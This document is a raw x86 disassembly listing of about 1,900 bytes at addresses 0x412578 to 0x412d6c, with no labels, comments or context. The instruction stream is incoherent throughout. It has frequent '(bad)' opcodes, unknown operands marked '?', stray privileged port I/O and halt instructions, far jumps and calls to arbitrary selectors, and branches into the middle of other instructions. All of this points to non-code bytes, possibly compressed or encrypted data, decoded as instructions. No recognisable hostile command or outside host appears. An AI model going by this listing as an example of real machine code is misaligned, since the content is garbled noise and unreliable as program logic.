  412578:	je     0x412500
  41257a:	ja     0x4125d3
  41257c:	xor    eax,0x5b5af63f
  412581:	adc    DWORD PTR [ecx+0x3d027462],esp
  412587:	retf   
  412588:	or     edx,edi
  41258a:	cmp    DWORD PTR [ebx-0x72d5142d],ebp
  412590:	int    0x3
  412592:	sbb    eax,0xce0ff338
  412597:	pop    edx
  412598:	xor    DWORD PTR [ebx-0x16],0x77e3bd0d
  41259f:	xchg   esp,eax
  4125a0:	nop
  4125a1:	push   es
  4125a2:	dec    esp
  4125a3:	sub    dl,BYTE PTR [ebp+0x4f2d9d44]
  4125a9:	aas    
  4125aa:	aas    
  4125ab:	sbb    DWORD PTR [esi+0x6d],eax
  4125ae:	(bad)  
  4125b2:	jmp    0x412abd
  4125b7:	sar    BYTE PTR ds:[edi],cl
  4125ba:	ret    0xd1d3
  4125bd:	rcl    edx,0xcb
  4125c0:	mov    ch,0x79
  4125c2:	or     eax,0xc0081638
  4125c7:	sub    al,0x6
  4125c9:	jg     0x412643
  4125cb:	push   0x7c
  4125cd:	js     0x412647
  4125cf:	shl    al,1
  4125d1:	mov    eax,ds:0xa427f89c
  4125d6:	in     eax,dx
  4125d7:	pop    edi
  4125d8:	inc    BYTE PTR [ebx+0x9]
  4125db:	sub    al,BYTE PTR [esi]
  4125dd:	xchg   ecx,eax
  4125de:	js     0x41264d
  4125e0:	adc    al,0x71
  4125e2:	stos   DWORD PTR es:[edi],eax
  4125e3:	jno    0x4125aa
  4125e5:	jmp    0x41256c
  4125e7:	shr    DWORD PTR [ecx],cl
  4125e9:	cmp    dl,bh
  4125eb:	push   ebp
  4125ec:	imul   eax,DWORD PTR [edi+0x55],0x8299245
  4125f3:	jge    0x41265c
  4125f5:	retf   0x7831
  4125f8:	outs   dx,BYTE PTR ds:[esi]
  4125f9:	dec    edi
  4125fa:	jo     0x412678
  4125fc:	dec    edi
  4125fd:	fadd   DWORD PTR ds:0x68991cb5
  412603:	mov    al,ds:0x73b192b0
  412608:	jmp    0x412676
  41260a:	mov    esp,esp
  41260c:	enter  0x33ac,0x92
  412610:	mov    edi,0x73337972
  412615:	out    0x97,al
  412617:	pop    ds
  412618:	mov    dl,al
  41261a:	mov    ecx,0x25b33fb5
  41261f:	cmp    eax,esi
  412621:	(bad)  
  412622:	ror    BYTE PTR ds:0x3054cf85,1
  412628:	arpl   WORD PTR [ebp+0x59d5aad5],sp
  41262e:	xor    al,0x84
  412630:	adc    BYTE PTR [ecx-0x7a2cf3df],al
  412636:	imul   ebx,esp,0x22
  412639:	jl     0x41265a
  41263b:	lds    edx,FWORD PTR [eax-0x2c838bcb]
  412641:	add    esp,DWORD PTR [ecx]
  412643:	aam    0x9c
  412645:	lods   al,BYTE PTR ds:[esi]
  412646:	in     eax,0x68
  412648:	and    DWORD PTR [ebx-0x70d5096a],eax
  41264e:	and    DWORD PTR [esi+0x5],0x51
  412652:	xchg   edx,eax
  412653:	ficomp DWORD PTR [ecx]
  412655:	xchg   BYTE PTR [ecx-0x1600b6a3],dh
  41265b:	aas    
  41265c:	int    0xae
  41265e:	loopne 0x4125e1
  412660:	push   0x75
  412662:	mov    bh,0x4d
  412664:	cmp    BYTE PTR [ebx+0x5a0e4fa],0xe5
  41266b:	jb     0x412652
  41266d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41266e:	mov    ds:0x3bc0055f,al
  412673:	xchg   edi,eax
  412674:	retf   0x2537
  412677:	ss (bad) 
  412679:	not    BYTE PTR [ebx+eiz*2]
  41267c:	imul   ebx,DWORD PTR [ecx],0x5e2390be
  412682:	and    edx,ebp
  412684:	inc    ebp
  412685:	stos   DWORD PTR es:[edi],eax
  412686:	imul   ecx,ebx,0x75
  412689:	cdq    
  41268a:	int    0x36
  41268c:	sub    DWORD PTR [ebx],0xffffffb6
  41268f:	inc    eax
  412690:	sbb    dl,dh
  412692:	adc    DWORD PTR [ebp+0xaa3d11a],ebp
  412698:	scas   eax,DWORD PTR es:[edi]
  412699:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41269a:	sub    DWORD PTR [ebp+edx*8-0x574796ba],0x17366813
  4126a5:	mov    ecx,DWORD PTR [eax]
  4126a7:	inc    ecx
  4126a8:	addr16 pusha 
  4126aa:	xchg   esi,eax
  4126ab:	retf   0x6f01
  4126ae:	jp     0x412714
  4126b0:	add    ebp,eax
  4126b2:	fcomip st,st(1)
  4126b4:	add    edx,DWORD PTR [ebx-0x5c]
  4126b7:	nop
  4126b8:	(bad)  
  4126ba:	nop
  4126bb:	jbe    0x412704
  4126bd:	xlat   BYTE PTR ds:[ebx]
  4126be:	cmc    
  4126bf:	sbb    DWORD PTR [ebp+0x6b],eax
  4126c2:	mov    gs,WORD PTR [edi+0x1ca9724f]
  4126c8:	jg     0x4126c9
  4126ca:	iret   
  4126cb:	jl     0x41274a
  4126cd:	add    bl,BYTE PTR [ebx-0x24b09d8d]
  4126d3:	(bad)  
  4126d4:	daa    
  4126d5:	push   ss
  4126d6:	sar    ecx,1
  4126d8:	adc    DWORD PTR [edi],edx
  4126da:	fmul   QWORD PTR [edi]
  4126dc:	pop    ebp
  4126dd:	pop    eax
  4126de:	inc    edi
  4126df:	loop   0x4126cf
  4126e1:	jae    0x4126dd
  4126e3:	in     eax,0x1a
  4126e5:	test   BYTE PTR [edx+ebp*4+0x7e],cl
  4126e9:	(bad)  
  4126ea:	push   0xfe9508a6
  4126ef:	out    dx,eax
  4126f0:	outs   dx,DWORD PTR ds:[esi]
  4126f1:	sbb    edx,ebp
  4126f3:	and    BYTE PTR [esi+esi*1],dh
  4126f6:	int3   
  4126f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126f8:	iret   
  4126f9:	(bad)
  4126fd:	fst    st(5)
  4126ff:	icebp  
  412700:	scas   eax,DWORD PTR es:[edi]
  412701:	std    
  412702:	and    eax,0x789b5b54
  412707:	pop    esp
  412708:	jnp    0x4126a9
  41270a:	out    0xda,al
  41270c:	int    0x3b
  41270e:	popf   
  41270f:	daa    
  412710:	mov    WORD PTR [edx+edi*4],?
  412713:	fild   QWORD PTR [esp+ecx*8-0x4d]
  412717:	outs   dx,DWORD PTR ds:[esi]
  412718:	dec    ebp
  412719:	stos   BYTE PTR es:[edi],al
  41271a:	push   edi
  41271b:	arpl   WORD PTR [esi-0x652b1163],dx
  412721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412722:	cmc    
  412723:	sub    ebp,DWORD PTR [esi+0x4b]
  412726:	out    0xf6,al
  412728:	xchg   ecx,eax
  412729:	repnz fisub WORD PTR [ebx+0x38]
  41272d:	add    al,0x9d
  41272f:	mov    WORD PTR [esi-0x64],es
  412732:	out    dx,eax
  412733:	sbb    dh,bl
  412735:	add    cl,BYTE PTR [edx-0x6b89d830]
  41273b:	add    DWORD PTR [ebx+0x50d462b1],edi
  412741:	cmc    
  412742:	adc    BYTE PTR [edx],bh
  412744:	in     eax,0x4a
  412746:	call   0x94221ed2
  41274b:	scas   eax,DWORD PTR es:[edi]
  41274c:	lods   eax,DWORD PTR ds:[esi]
  41274d:	(bad)  
  41274e:	cmp    al,0x56
  412750:	mov    ebp,0x2d3180a4
  412755:	xchg   ecx,eax
  412756:	outs   dx,BYTE PTR ds:[esi]
  412757:	(bad)  
  412758:	and    edx,esp
  41275a:	es (bad) 
  41275c:	loope  0x41272a
  41275e:	pop    eax
  41275f:	pushf  
  412760:	cwde   
  412761:	dec    esi
  412763:	shr    BYTE PTR [edx+0xfb51359],1
  412769:	push   esp
  41276a:	dec    esi
  41276b:	(bad)  
  41276c:	ja     0x412787
  41276e:	fst    QWORD PTR [edx-0x31ea22f5]
  412774:	xchg   ah,bh
  412776:	push   ebx
  412777:	xor    al,0xe8
  412779:	mov    esi,0xff7744f6
  41277e:	inc    ebp
  41277f:	shl    BYTE PTR [eax+eax*2+0xf],1
  412783:	sub    esi,edi
  412785:	pop    edx
  412786:	sbb    eax,0xc4cf1d23
  41278b:	and    eax,0x9b5683a8
  412790:	fild   DWORD PTR [edi-0x51]
  412793:	call   0xa0aa:0x685c974a
  41279a:	fs (bad) 
  41279c:	mov    al,BYTE PTR [esi+0x6d]
  41279f:	lahf   
  4127a0:	fild   WORD PTR [edi]
  4127a2:	scas   al,BYTE PTR es:[edi]
  4127a3:	push   ds
  4127a4:	cmp    al,0xd6
  4127a6:	push   0xffffff94
  4127a8:	jecxz  0x412812
  4127aa:	push   ecx
  4127ab:	cs mov dh,0x36
  4127ae:	mov    DWORD PTR [edi-0x7a69b314],esp
  4127b4:	add    esp,DWORD PTR [edi+0x3c4a472c]
  4127ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127bb:	fldcw  WORD PTR [esi-0x4285999]
  4127c1:	mov    WORD PTR gs:[edx-0x6093af76],es
  4127c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127c9:	sub    BYTE PTR [eax],al
  4127cb:	ret    
  4127cc:	sub    DWORD PTR [ebp+0x7666aa92],edi
  4127d2:	mov    ebp,0x5734a92e
  4127d7:	int3   
  4127d8:	jmp    0x41283d
  4127da:	in     al,0x2e
  4127dc:	outs   dx,BYTE PTR ds:[esi]
  4127dd:	mov    eax,0x190a20ee
  4127e2:	jle    0x4127d0
  4127e4:	sub    bl,cl
  4127e6:	mov    BYTE PTR [edi+0x24614f73],cl
  4127ec:	out    0xa6,eax
  4127ee:	jle    0x41277e
  4127f0:	or     BYTE PTR [edx+0x123483d9],dh
  4127f6:	mov    WORD PTR [edi],es
  4127f8:	test   DWORD PTR [edx],ebx
  4127fa:	jg     0x4127b3
  4127fc:	sbb    DWORD PTR [edx+0x250c874d],edi
  412802:	(bad)  
  412804:	ret    0x10d
  412807:	and    cl,ah
  412809:	pop    ecx
  41280a:	xor    eax,0x3e626aa7
  41280f:	mov    ch,BYTE PTR [edx+ebp*2]
  412812:	pusha  
  412813:	pop    ebp
  412814:	push   esi
  412815:	pop    esi
  412816:	sub    eax,0x22bf63f9
  41281b:	sbb    eax,0xa9c26382
  412820:	out    dx,eax
  412821:	xchg   ecx,eax
  412822:	(bad)  
  412823:	xchg   esp,eax
  412824:	lods   al,BYTE PTR ds:[esi]
  412825:	jne    0x4127f2
  412827:	and    ch,BYTE PTR [esi-0x2e]
  41282a:	ins    BYTE PTR es:[edi],dx
  41282b:	xor    ax,0xc8fa
  41282f:	in     eax,0x79
  412831:	test   eax,0xd60e558c
  412836:	mov    esp,0x9c5258e0
  41283b:	not    BYTE PTR [ebp+0x62ce22ee]
  412841:	cwde   
  412842:	jae    0x412895
  412844:	ret    
  412845:	and    esp,DWORD PTR [edi-0x2]
  412848:	and    DWORD PTR [esi],ebx
  41284a:	fcom   DWORD PTR [ebx+0x20]
  41284d:	jp     0x41280e
  41284f:	mov    al,es:0x2a444448
  412855:	inc    edx
  412856:	add    DWORD PTR [ecx],ebp
  412858:	stos   DWORD PTR es:[edi],eax
  412859:	pop    es
  41285a:	(bad)  
  41285b:	jmp    0x26fc2b91
  412860:	sbb    al,BYTE PTR [ecx+0x76]
  412863:	pop    esi
  412864:	add    eax,0x75a64ef6
  412869:	add    ebp,0x59
  41286c:	sar    DWORD PTR [edx-0x3f],cl
  41286f:	ja     0x412804
  412871:	(bad)  
  412872:	push   eax
  412873:	leave  
  412874:	call   DWORD PTR [eax+eiz*1+0x0]
  412878:	cwde   
  412879:	repz inc esi
  41287b:	add    DWORD PTR [edx+ebx*2+0x56],0x4e
  412880:	div    DWORD PTR [ebx+0x64]
  412883:	out    0x4a,al
  412885:	and    ch,BYTE PTR [ecx-0x61]
  412888:	adc    WORD PTR ds:0x8bf948f5,dx
  41288f:	frstor [ebx]
  412891:	mov    edi,0x9eb17ee3
  412896:	test   ecx,0x116038a6
  41289c:	sti    
  41289d:	imul   esp,DWORD PTR [eax+0x4142e2de],0xffffffaf
  4128a4:	outs   dx,BYTE PTR fs:[esi]
  4128a6:	dec    ebx
  4128a7:	sub    eax,0x512ba2e9
  4128ac:	jnp    0x41289d
  4128ae:	sbb    edx,ebx
  4128b0:	jmp    0x9710:0x680ebaec
  4128b7:	mov    ecx,0xd69d22e8
  4128bc:	jp     0x412892
  4128be:	xor    dh,BYTE PTR cs:[ecx+0x2089ca9a]
  4128c5:	(bad)  [edi]
  4128c7:	sbb    BYTE PTR [edx],bl
  4128c9:	arpl   WORD PTR [ecx+0x63],cx
  4128cc:	fs mov edx,0x23ff3152
  4128d2:	mov    ah,0xa6
  4128d4:	nop
  4128d5:	addr16 push edx
  4128d7:	imul   DWORD PTR [ecx]
  4128d9:	mov    eax,0x5076cae3
  4128de:	ins    DWORD PTR es:[edi],dx
  4128df:	mov    ah,0x93
  4128e1:	xor    dh,dl
  4128e3:	mov    BYTE PTR [ebx-0x5],ch
  4128e6:	sbb    ch,BYTE PTR [ebp-0x6271c4b2]
  4128ec:	adc    bl,0x5a
  4128ef:	retf   0xbf32
  4128f2:	repnz or al,0xcb
  4128f5:	div    BYTE PTR [edx+eax*2-0x6c5f230c]
  4128fc:	fs push es
  4128fe:	stc    
  4128ff:	ret    0xd961
  412902:	rcl    BYTE PTR [edx-0x2a],0xd3
  412906:	(bad)  
  412907:	dec    ebx
  412908:	shl    BYTE PTR [ebp+0x3858d11a],0xfe
  41290f:	out    dx,eax
  412910:	es hlt 
  412912:	jge    0x412984
  412914:	jnp    0x4128c3
  412916:	mov    dl,0x43
  412918:	sbb    bl,BYTE PTR [esi+0x2c]
  41291b:	fbld   TBYTE PTR [edx+0x639ea9d6]
  412921:	lds    edi,FWORD PTR [edx-0xc]
  412924:	fninit 
  412926:	loopne 0x4128c5
  412928:	nop
  412929:	int3   
  41292a:	push   eax
  41292b:	into   
  41292c:	pushf  
  41292d:	or     DWORD PTR [edx+ebp*2+0x7f],esi
  412931:	pusha  
  412932:	mov    dh,0xa5
  412934:	cld    
  412935:	retf   0x1f61
  412938:	cld    
  412939:	ja     0x4128d8
  41293b:	mov    bl,0xf0
  41293d:	xlat   BYTE PTR ds:[ebx]
  41293e:	mov    esp,0xac7d36f8
  412943:	pop    ebp
  412944:	mov    ds:0x15943f87,eax
  412949:	lods   al,BYTE PTR ds:[esi]
  41294a:	adc    DWORD PTR [esi],edi
  41294c:	fmulp  st(5),st
  41294e:	cmp    al,BYTE PTR [ebx-0x15]
  412951:	push   ds
  412952:	mov    ecx,0x2dc4c10
  412957:	out    0xd1,al
  412959:	lock call 0xc8d4:0x67427979
  412961:	lea    eax,[ecx+0x2795cdb7]
  412967:	and    DWORD PTR [eax-0x76],ecx
  41296a:	call   0x3744:0x7201d226
  412971:	sbb    cl,BYTE PTR [edx+ecx*4+0x6d]
  412975:	adc    edi,esp
  412977:	mov    ?,esp
  412979:	mov    esp,0x1ea523
  41297e:	or     eax,DWORD PTR [eax+0x6b0eaea]
  412984:	imul   ecx,DWORD PTR [edx-0x6539eb53],0xffffffc4
  41298b:	xlat   BYTE PTR ds:[ebx]
  41298c:	mov    edx,0x78986d20
  412991:	xchg   ecx,eax
  412992:	dec    eax
  412993:	lds    edi,FWORD PTR [edx]
  412995:	repz lock repz pusha 
  412999:	fs ret 0x9139
  41299d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41299e:	adc    BYTE PTR [ebx-0x36242e03],dh
  4129a4:	cmp    BYTE PTR [esi-0x73e3705b],bl
  4129aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129ab:	xchg   ecx,eax
  4129ac:	ret    
  4129ad:	dec    ebp
  4129ae:	aam    0x64
  4129b0:	int3   
  4129b1:	mov    edi,0x951ada0a
  4129b6:	inc    edi
  4129b7:	sbb    al,0x87
  4129b9:	test   al,0xf2
  4129bb:	pop    ds
  4129bc:	(bad)  
  4129bd:	xchg   edi,eax
  4129be:	pop    ss
  4129bf:	cmp    ebx,ecx
  4129c1:	mov    ebp,0xcd66adce
  4129c6:	dec    esp
  4129c7:	icebp  
  4129c8:	enter  0x2a8,0x91
  4129cc:	mov    cl,0x72
  4129ce:	pop    es
  4129cf:	loopne 0x412960
  4129d1:	in     eax,0x57
  4129d3:	dec    esp
  4129d4:	mov    al,0x60
  4129d6:	pop    ss
  4129d7:	sub    bh,bl
  4129d9:	cmp    ebx,DWORD PTR [esi-0x1fbe6534]
  4129df:	or     eax,0x455d4657
  4129e4:	fcom   QWORD PTR [esi+0x21]
  4129e7:	adc    BYTE PTR [edx],ch
  4129e9:	push   esp
  4129ea:	retf   
  4129eb:	push   esp
  4129ec:	(bad)  
  4129ee:	pusha  
  4129ef:	mov    ebx,0x7290b125
  4129f4:	dec    edx
  4129f5:	sub    BYTE PTR [edi],dl
  4129f7:	mov    al,0xd
  4129f9:	jbe    0x412a53
  4129fb:	inc    ebp
  4129fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129fd:	sbb    ah,BYTE PTR [ebp+0x74e4ec3c]
  412a03:	inc    esi
  412a04:	sbb    dh,ch
  412a06:	fadd   st(7),st
  412a08:	std    
  412a09:	mov    esi,0x228a051a
  412a0e:	cli    
  412a0f:	mov    al,ds:0x8a365fdd
  412a14:	push   0xffffffe3
  412a16:	fwait
  412a17:	sbb    BYTE PTR [edx],bh
  412a19:	(bad)  
  412a1a:	loope  0x4129bb
  412a1c:	jno    0x412a43
  412a1e:	out    dx,al
  412a1f:	cmp    BYTE PTR [esi+0x26f14f3b],0xe2
  412a26:	cmp    eax,0xd0d8a6a
  412a2b:	cmp    eax,esi
  412a2d:	in     eax,dx
  412a2e:	loop   0x412a70
  412a30:	arpl   WORD PTR ds:0xf85628fb,dx
  412a36:	es xchg ebx,eax
  412a38:	push   ebp
  412a39:	dec    ecx
  412a3a:	sub    ebp,esi
  412a3c:	dec    esp
  412a3d:	shl    BYTE PTR [ebp-0x3b70b5e],0xf5
  412a44:	fisub  WORD PTR [ebx-0x5f]
  412a47:	xchg   ebp,eax
  412a48:	xchg   BYTE PTR ds:0x6f4bccd2,ch
  412a4e:	popa   
  412a4f:	jl     0x412a97
  412a51:	sub    al,0x8c
  412a53:	fs mov al,cs:0xf2097f89
  412a5a:	sub    BYTE PTR [esi+0x42],0xaa
  412a5e:	sub    al,0xb9
  412a60:	cdq    
  412a61:	sbb    BYTE PTR [ebx-0x1e],al
  412a64:	repnz test ax,0xe47a
  412a69:	jno    0x412a35
  412a6b:	mov    dh,0x56
  412a6d:	test   BYTE PTR [ebp+ebp*4+0x2],cl
  412a71:	lahf   
  412a72:	cwde   
  412a73:	mov    eax,0x45066d8d
  412a78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a79:	pop    ss
  412a7a:	push   0xc
  412a7c:	ja     0x412a78
  412a7e:	fcmove st,st(3)
  412a80:	mov    edx,0x86ae403
  412a85:	inc    edi
  412a86:	retf   
  412a87:	(bad)  
  412a88:	mov    ds:0xf3385e29,al
  412a8d:	rcl    DWORD PTR [esp+ecx*8+0x53afbc06],1
  412a94:	sub    dl,0x46
  412a97:	outs   dx,DWORD PTR ds:[esi]
  412a98:	xchg   ecx,eax
  412a99:	mov    edx,0xc81fcf8
  412a9e:	ret    0x4b47
  412aa1:	out    dx,al
  412aa2:	int    0x10
  412aa4:	push   edi
  412aa5:	dec    ebx
  412aa6:	inc    esp
  412aa7:	or     dh,dh
  412aa9:	icebp  
  412aaa:	out    0x85,eax
  412aac:	das    
  412aad:	les    esi,FWORD PTR [ecx+esi*2]
  412ab0:	mov    cl,0x46
  412ab2:	sub    bl,dl
  412ab4:	int3   
  412ab5:	xor    al,0x30
  412ab7:	xchg   esi,eax
  412ab8:	test   edx,eax
  412aba:	outs   dx,BYTE PTR ds:[esi]
  412abb:	adc    dh,BYTE PTR [ebp-0x1]
  412abe:	jne    0x412aa8
  412ac0:	jmp    0x412fcb
  412ac5:	ror    ebp,0xd6
  412ac8:	(bad)  
  412ac9:	fcmovbe st,st(5)
  412acb:	rcr    ecx,0xdb
  412ace:	mov    ds:0xc855d96e,al
  412ad3:	mov    BYTE PTR [eax],ch
  412ad5:	push   ds
  412ad6:	or     DWORD PTR [edi+0x78],edi
  412ad9:	push   0x7c
  412adb:	js     0x412b55
  412add:	mul    DWORD PTR [bx+si-0x26]
  412ae1:	xchg   esi,eax
  412ae2:	inc    edi
  412ae3:	rcr    BYTE PTR [edi+0x34],0xce
  412ae7:	pop    edx
  412ae8:	mov    edx,0x16e578d6
  412aed:	adc    al,BYTE PTR [ecx-0x56e80107]
  412af3:	mov    ah,0xe8
  412af5:	outs   dx,BYTE PTR ds:[esi]
  412af6:	sbb    ebp,0x6
  412af9:	retf   0xe39c
  412afc:	sub    eax,0xae38a4e9
  412b01:	ja     0x412ab7
  412b03:	mov    eax,0x3a077fc0
  412b08:	ror    BYTE PTR [ebp+0x2],0xf4
  412b0c:	(bad)  
  412b0d:	jae    0x412ac7
  412b0f:	jo     0x412b36
  412b11:	call   DWORD PTR ds:0xb8ec2833
  412b17:	push   edx
  412b18:	mov    dh,dh
  412b1a:	xor    BYTE PTR [edx-0x1b],ch
  412b1d:	or     al,0x1d
  412b1f:	sub    eax,0x6fdf69ec
  412b24:	leave  
  412b25:	rcl    edi,cl
  412b27:	dec    edi
  412b28:	ja     0x412ad2
  412b2a:	addr16 sub ebx,edx
  412b2d:	xchg   ebp,eax
  412b2e:	retf   0xcb08
  412b31:	mov    ds:0xc1ec25e4,eax
  412b36:	mov    dl,0xc1
  412b38:	and    al,0x29
  412b3a:	out    dx,eax
  412b3b:	push   esp
  412b3c:	mov    edx,edi
  412b3e:	sbb    eax,0xf49f0d31
  412b43:	aad    0x22
  412b45:	dec    esi
  412b46:	ins    DWORD PTR es:[edi],dx
  412b47:	cmp    bl,BYTE PTR [edi]
  412b49:	gs pop ebx
  412b4b:	pop    edx
  412b4c:	nop
  412b4d:	adc    ecx,DWORD PTR [esi]
  412b4f:	push   ebp
  412b50:	enter  0xf4f9,0x21
  412b54:	aaa    
  412b55:	btr    DWORD PTR [esp+ebx*2],ebx
  412b59:	popf   
  412b5a:	in     eax,0x77
  412b5c:	ja     0x412ba8
  412b5e:	rol    DWORD PTR [ebp+0x61],0x9d
  412b62:	aad    0x9
  412b64:	dec    esi
  412b65:	cmp    eax,0x3ec9bc61
  412b6a:	fwait
  412b6b:	imul   eax,DWORD PTR [ebx+0x5d8781d4],0x6ae50484
  412b75:	cld    
  412b76:	cmp    eax,0xf3c57fdb
  412b7b:	int3   
  412b7c:	push   eax
  412b7d:	jge    0x412bc3
  412b7f:	test   al,0x51
  412b81:	jb     0x412bcd
  412b83:	or     BYTE PTR [eax-0x5d],bl
  412b86:	dec    esi
  412b87:	gs (bad) 
  412b8a:	fmul   QWORD PTR [ebp+ecx*1-0x6687025f]
  412b91:	xlat   BYTE PTR ds:[ebx]
  412b92:	mov    bl,0x2d
  412b94:	xor    ecx,edx
  412b96:	xor    BYTE PTR [ecx+esi*8-0x222ea3d3],ah
  412b9d:	(bad)  
  412b9e:	cs mov ebx,0x676a0c7d
  412ba4:	cmp    eax,0xd72f29ef
  412ba9:	out    0x4f,al
  412bab:	repz inc ebx
  412bad:	cmp    cx,0xfb26
  412bb2:	sti    
  412bb3:	jae    0x412b59
  412bb5:	jl     0x412b7b
  412bb7:	sahf   
  412bb8:	test   al,0xeb
  412bba:	mov    gs,ebx
  412bbc:	or     ecx,DWORD PTR [bx-0x6450]
  412bc1:	sub    bh,BYTE PTR [ecx-0x3ae12c57]
  412bc7:	jne    0x412c18
  412bc9:	xchg   dh,bl
  412bcb:	inc    ebx
  412bcc:	aad    0x54
  412bce:	in     al,0x21
  412bd0:	mov    ds:0x7b95b108,eax
  412bd5:	test   DWORD PTR [ecx],0x71c93553
  412bdb:	cmp    esi,DWORD PTR [esi]
  412bdd:	es pop ss
  412bdf:	bound  edx,QWORD PTR [esi-0x1f5daa70]
  412be5:	push   ss
  412be6:	cmp    al,0x5f
  412be8:	fstp   TBYTE PTR [ecx]
  412bea:	add    eax,0x45e8f2a0
  412bef:	xchg   edx,eax
  412bf0:	sbb    BYTE PTR [ebx],bl
  412bf2:	jmp    0x412c44
  412bf4:	repz sbb eax,0x318c3878
  412bfa:	adc    BYTE PTR [ebx+ebx*4-0x7b],ch
  412bfe:	test   al,0x3f
  412c00:	xchg   esi,eax
  412c01:	out    0x3f,eax
  412c03:	fadd   DWORD PTR [ebx-0x2b163a30]
  412c09:	pop    eax
  412c0a:	adc    ebx,DWORD PTR [eax+ecx*1-0x44350263]
  412c11:	dec    edx
  412c12:	pop    ds
  412c13:	test   DWORD PTR [edi+0x5e],0xdd0b0fb9
  412c1a:	and    DWORD PTR [ecx-0x51],edx
  412c1d:	jmp    0x15c78e76
  412c22:	fidiv  DWORD PTR [eax+ecx*8+0x3e]
  412c26:	jnp    0x412ba9
  412c28:	iret   
  412c29:	aas    
  412c2a:	je     0x412c0d
  412c2c:	sbb    eax,0x78c0dca7
  412c31:	or     BYTE PTR [esi-0x683e4c97],ch
  412c37:	sbb    eax,0x887db2ca
  412c3c:	inc    esi
  412c3d:	or     ebp,edx
  412c3f:	fs jmp 0xb355:0xd8f519dd
  412c47:	cmp    DWORD PTR [ebp-0x23e55253],ebp
  412c4d:	dec    edi
  412c4e:	push   0xffffff9e
  412c50:	cmp    eax,0x1af1ab9a
  412c55:	aaa    
  412c56:	push   ds
  412c57:	scas   eax,DWORD PTR es:[edi]
  412c58:	dec    eax
  412c59:	add    BYTE PTR [edx-0x33fc5ad9],al
  412c5f:	cwde   
  412c60:	mov    ebp,0x6e561d5b
  412c65:	aas    
  412c66:	push   ebx
  412c67:	dec    ebp
  412c68:	push   ecx
  412c69:	sbb    al,0x69
  412c6b:	xchg   ebp,eax
  412c6c:	retf   
  412c6d:	rcl    DWORD PTR [eax],1
  412c6f:	pop    es
  412c70:	xor    DWORD PTR [edi+0x67],eax
  412c73:	shl    DWORD PTR [edi],1
  412c75:	sub    al,0xac
  412c77:	or     edx,DWORD PTR ds:0xfeaeaa0f
  412c7d:	lock mov ebx,ebx
  412c80:	(bad)  
  412c81:	popa   
  412c82:	xchg   ebp,eax
  412c83:	push   eax
  412c84:	xchg   esp,eax
  412c85:	outs   dx,DWORD PTR ds:[esi]
  412c86:	and    BYTE PTR [esi],dl
  412c88:	test   eax,0x9c081f1c
  412c8d:	xor    al,0x13
  412c8f:	aaa    
  412c90:	pushf  
  412c91:	in     eax,0xf8
  412c93:	in     al,0xc2
  412c95:	das    
  412c96:	mov    ch,0x97
  412c98:	xor    DWORD PTR [ebp-0xecb6653],ecx
  412c9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c9f:	xor    cl,cl
  412ca1:	fdiv   DWORD PTR [ebx+0x5a]
  412ca4:	mov    ds:0xf30596d4,eax
  412ca9:	rcl    BYTE PTR [ebx+0x462056d9],0x3e
  412cb0:	jae    0x412d2d
  412cb2:	idiv   al
  412cb4:	into   
  412cb5:	ror    DWORD PTR [edi+0x763637a],0x5d
  412cbc:	retf   
  412cbd:	adc    esi,ecx
  412cbf:	repz cwde 
  412cc1:	daa    
  412cc2:	pop    ebx
  412cc3:	in     al,dx
  412cc4:	xchg   edi,eax
  412cc6:	in     al,dx
  412cc7:	sbb    eax,DWORD PTR [eax+ebp*2]
  412cca:	dec    ebx
  412ccb:	sub    esi,DWORD PTR [ecx]
  412ccd:	retf   
  412cce:	pop    ecx
  412ccf:	xchg   ecx,eax
  412cd0:	into   
  412cd1:	call   0xab5835ef
  412cd6:	add    eax,0x1104972a
  412cdb:	sbb    ebx,ebx
  412cdd:	mov    WORD PTR [eax+0x601e6068],?
  412ce3:	jbe    0x412ca9
  412ce5:	loopne 0x412d3d
  412ce7:	ret    
  412ce8:	pushf  
  412ce9:	push   es
  412cea:	je     0x412d0d
  412cec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ced:	dec    ebx
  412cee:	int3   
  412cef:	loope  0x412cbc
  412cf1:	(bad)  
  412cf3:	dec    edi
  412cf4:	and    esp,0xd25375b
  412cfa:	and    al,0x26
  412cfc:	rcr    DWORD PTR [edx],1
  412cfe:	(bad)  
  412cff:	pop    eax
  412d00:	sub    DWORD PTR [edi+0x3c5a34c9],ebp
  412d06:	dec    ecx
  412d07:	test   eax,0xde5022bd
  412d0c:	cdq    
  412d0d:	test   BYTE PTR [edi-0x6e],dl
  412d10:	aam    0x44
  412d12:	mul    DWORD PTR [esp+esi*2-0x542c8808]
  412d19:	xchg   ebp,eax
  412d1a:	jg     0x412cb5
  412d1c:	jge    0x412d2f
  412d1e:	into   
  412d1f:	sub    al,0x3f
  412d21:	pop    esp
  412d23:	pop    ebp
  412d24:	sbb    edx,DWORD PTR [esi+0x255ace72]
  412d2a:	outs   dx,BYTE PTR ds:[si]
  412d2c:	test   eax,0x6e251115
  412d31:	and    edx,ecx
  412d33:	sbb    dh,BYTE PTR [ebp-0x23]
  412d36:	mov    dh,0x11
  412d38:	inc    ebx
  412d39:	pop    ebp
  412d3a:	xchg   edx,eax
  412d3b:	adc    al,0x34
  412d3d:	fisubr DWORD PTR [ecx-0x2af66f44]
  412d43:	sub    eax,0x466c4e72
  412d48:	aam    0xa2
  412d4a:	adc    esi,esi
  412d4c:	push   edx
  412d4d:	test   al,0x19
  412d4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d50:	dec    ecx
  412d51:	xchg   DWORD PTR [ebx+0x25],ebx
  412d54:	rcl    DWORD PTR [ecx-0x2b646af9],0x2d
  412d5b:	rol    esi,1
  412d5d:	and    al,0x66
  412d5f:	and    eax,0x3d6a1a8a
  412d64:	imul   ecx,DWORD PTR [ecx+edx*1],0xbb2cbbe5
  412d6b:	cdq    
  412d6c:	mov    al,0x6
